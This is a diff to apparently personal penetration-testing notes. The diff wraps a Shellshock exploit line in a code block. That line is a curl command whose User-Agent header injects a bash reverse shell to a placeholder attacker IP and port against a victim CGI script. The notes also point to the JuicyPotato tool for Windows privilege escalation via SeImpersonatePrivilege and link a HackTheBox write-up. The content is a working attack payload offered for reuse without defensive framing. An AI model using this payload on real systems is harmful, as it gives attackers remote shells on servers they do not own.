@@ -1,8 +1,9 @@
 # Notes
 ### ShellShock PHP < 5.6.2
 
+```
 curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/ATTACKER IP/PORT 0>&1'  http://VICTOM/cgi-bin/admin.cgi
-
+```
 ### Privilege Escalation through SeImpersonatePrivilege permission (JuicyPotato)
 https://github.com/ohpe/juicy-potato/releases
 https://www.absolomb.com/2018-05-04-HackTheBox-Tally/
